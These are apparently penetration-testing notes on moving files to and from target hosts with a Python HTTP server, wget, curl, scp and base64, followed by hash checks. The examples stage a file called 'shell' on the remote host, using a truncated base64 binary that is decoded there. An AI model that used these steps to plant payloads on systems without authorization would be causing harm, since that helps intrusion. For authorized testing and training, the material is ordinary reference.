# Transferring Files

Methods for transferring files to and from target systems during penetration testing.

---

## Using wget

### Python HTTP Server

Run a Python HTTP server on our machine and then use wget or cURL to download the file on the remote host.

**Step 1:** Go to the directory that contains the file we need to transfer and run a Python HTTP server:

```bash
cd /tmp
python3 -m http.server 8000
```

**Step 2:** Download the file on the remote host:

```bash
wget http://<ip-address>/<filename>
```

## Using cURL

If the remote host does not have wget, we can use curl to download the file:

```bash
curl http://<ip-address>/<filename> -o <filename>
```

## Using SCP

If we have the `ssh credentials` on the remote host, we can use scp:

```bash
scp <filename> user@remotehost:/tmp/<filename>
```

## Using Base64

If none of the above methods work, we can base64 encode the file and paste the string on the remote server.

### Encode on Local Machine

```bash
# Consider that we want to transfer a file called shell
base64 shell -w 0
```

### Decode on Remote Host

Copy the base64 string to the remote host and use `base64 -d` to decode it:

```bash
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

## Validating File Transfers

### Check File Format

```bash
file shell
```

### Verify MD5 Hash

To ensure we did not mess up the file during encoding/decoding process, check its md5 hash on both machines:

```bash
md5sum shell
```

Run the same command at both the remote server and our own machine and verify that they are the same.

---

See also: [[1. SSH]]